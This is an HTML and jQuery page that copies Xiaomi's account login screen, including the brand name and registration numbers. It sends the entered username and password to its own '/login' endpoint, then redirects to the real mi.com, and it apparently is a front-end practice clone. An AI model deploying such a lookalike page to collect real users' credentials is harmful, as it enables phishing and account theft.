<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>小米登录</title>
    <link rel="stylesheet" href="./css/master.css">
  </head>
  <body>
    <div class="head w"></div>
    <div class="mainbg">
      <div class="w">
        <div class="bg">
        <div class="loginbox">
          <div class="title">
            <span id="zh">帐号登录</span>
            <span>|</span>
            <span>扫码登录</span>
          </div>
          <div class="lgn">
            <div class="top clearfix">
              <input type="text" name="username" placeholder="邮箱/手机号/小米帐号">
              <div class="item">!请输入账户名</div>
              <div class="ky">用户名可用</div>
              <div class="bky">!用户名不可用</div>
            </div>
            <div class="bottom clearfix">
              <input type="password" name="passwd" placeholder="密码">
              <div class="item">!请输入密码</div>
            </div>
            <button id="btn">立即登录</button>
          </div>

        </div>
        </div>
      </div>
    </div>
    <div class="custom w">
      <div class="top">
        <a href="#">简体</a>
        <span>|</span>
        <a href="#">繁体</a>
        <span>|</span>
        <a href="#">English</a>
        <span>|</span>
        <a href="#">常见问题</a>
      </div>
      <div class="bottom">
        <span>小米公司版权所有-京ICP备10046444</span>
        <img src="./images/ghs.png" alt="无法显示图片">
        <span>-京公网安备11010802020134号-京ICP证110507号</span>
      </div>
    </div>

    <script src="./js/jquery.min.js" charset="utf-8"></script>
    <script type="text/javascript">
      $(function(){
        var text;
        var usernamebox = $("input[name=username]");
        var passwdbox = $("input[name=passwd]");
        usernamebox.focus(function(){

        }).blur(function(){
          $(this).next().css("visibility","hidden");
          usernamebox.css("border","1px solid #e0e0e0");
        });

        passwdbox.focus(function(){
          // $(this).next().css("visibility","visible");
        }).blur(function(){
          passwdbox.next().css("visibility","hidden");
          usernamebox.css("border","1px solid #e0e0e0");
        });

        $(".lgn #btn").click(function(){
          var user = usernamebox.val();
          var pwd = passwdbox.val();
          if(!user){
            // 用户名为空
            usernamebox.css("border","1px solid #f56600");
            usernamebox.next().css("visibility","visible");
          }else if(!pwd){
            usernamebox.next().css("visibility","hidden");
            passwdbox.css("border","1px solid #f56600");
            passwdbox.next().css("visibility","visible");
          }else {
            passwdbox.next().css("visibility","hidden");
            passwdbox.css("border","1px solid #e0e0e0");
          }
          /*
          用户的输入都是合法的，发送ajax登录请求
          */
          $.ajax({
             method: "post",
             url: "/login",
             data: {name: user, passwd: pwd},
             success: function(data, textStatus, jqXHR){
               if (data == "OK"){
                 //登录
                //  alert("111");
                 window.location = "https://www.mi.com/";
               } else {
                 //将input的值设置为空
                 $(".login input").val("");
                 alert("用户名或密码错误");
                 usernamebox.css("border","1px solid #f56600");
                 passwdbox.css("border","1px solid #f56600");
                 usernamebox.next().css("visibility","visible");
               }
             },
             error: function(jqXHR, textStatus, error){
               console.error(error);
             }
          });
        });

      });
    </script>
  </body>
</html>
